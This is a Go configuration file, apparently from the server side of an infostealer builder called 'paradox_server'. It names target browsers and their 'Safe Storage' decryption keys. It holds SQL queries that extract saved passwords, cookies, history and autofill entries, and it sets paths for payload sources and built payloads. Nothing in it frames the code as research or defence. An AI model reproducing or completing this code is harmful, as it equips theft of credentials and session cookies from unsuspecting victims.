package static

import (
	"path/filepath"

	"paradox_server/models"
)

var SupportedBrowsers = []models.BrowserConfig{
	{Name: "Chrome", PathString: filepath.Join("Browsers", "Chrome"), PrintName: "b'Chrome Safe Storage'"},
	{Name: "Edge", PathString: filepath.Join("Browsers", "Edge"), PrintName: "b'Edge Safe Storage'"},
	{Name: "Brave", PathString: filepath.Join("Browsers", "Brave"), PrintName: "b'Brave Safe Storage'"},
	{Name: "Vivaldi", PathString: filepath.Join("Browsers", "Vivaldi"), PrintName: "b'Vivaldi Safe Storage'"},
	{Name: "Opera", PathString: filepath.Join("Browsers", "Opera"), PrintName: "b'Opera Safe Storage'"},
	//{Name: "Firefox", PathString: filepath.Join("Browsers", "Firefox"), PrintName: ""},
}

var (
	QueryFirefoxCookie   = `SELECT name, value, host, path, creationTime, expiry, isSecure, isHttpOnly FROM moz_cookies`
	QueryChromiumCookie  = `SELECT name, encrypted_value, host_key, path, creation_utc, expires_utc, is_secure, is_httponly, has_expires, is_persistent FROM cookies`
	QueryChromiumLogin   = `SELECT origin_url, username_value, password_value, date_created FROM logins`
	QueryChromiumHistory = `SELECT url, title, visit_count, last_visit_time, typed_count, hidden FROM urls`
	QueryChromiumWebData = `SELECT name, value, date_created, date_last_used, count, form_data_type FROM autofill`
)

const (
	PayloadOutputDir = "../built"
	PayloadSourceDir = "../payload"
	DBFile           = "builds.db"
)
